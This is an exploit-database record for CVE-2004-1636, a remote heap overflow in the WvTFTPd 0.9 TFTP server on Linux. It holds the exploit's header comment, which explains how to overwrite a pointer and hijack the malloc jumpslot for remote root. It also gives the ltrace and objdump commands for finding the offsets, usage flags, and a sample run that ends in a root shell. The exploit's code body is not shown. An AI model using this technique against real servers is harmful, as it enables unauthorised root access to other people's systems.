{
    "text": "ecve : CVE-2004-1636 ， title : WvTFTPd 0.9 - Remote Heap Overflow - Linux remote Exploit ， verified : Verified ， exploit_detail : / *  ，  * wvtftp option name heap overflow remote root exploit ，  * infamous42md AT hotpop DOT com ，  * exploitation is not exactly straight forward. When we overflow our buffer ,  ，  * we overwrite a pointer that is freed before we get to trigger our overwrite. ，  * so we have to restore the state of this pointer to some sane value so it can ，  * be freed. after we do this , we trigger the overwrite , and hijack the ，  * jumpslot for malloc (  ) . then to trigger malloc (  )  , we send a bogus request ,  ，  * and then connect to our shell. all of the offsets should be fixed for 32 bit ，  * platforms , all you need to pass is the base address of the heap buffer we're ，  * overflowing. 'ltrace wvtftpd -dd 2>&1 | grep malloc | grep 616' , and of ，  * course the jumpslot for malloc (  )  , 'objdump -R wvtftpd | grep malloc'. ，  * / ，  # if 0 ， Usage : ./a.out ，  [ -h host ]  [ -r object_heap_base ]  [ -l retloc ]  ，  [ -f remote file ] < -p port > < -a align > ，  [ n00b @ localho.outernet ] ./a.out -h localho -r 0x8063cd0 -l 0x0805e540 ， connected to localho ( 127.0.0.1 )  ， exploit sent , total data len 597 ， triggering overwritten jumpslot ， connected to localho ( 127.0.0.1 )  ， got a shell ， id ， uid=0 ( root ) gid=0 ( root )  ， groups=0 ( root )  , 1 ( bin )  , 2 ( daemon )  , 3 ( sys )  , 4 ( adm )  , 6 ( disk )  , 10 ( wheel )  , 11 ( floppy )  ， - Connection closed by user ，  # endif",
    "time": "2004-10-28"
}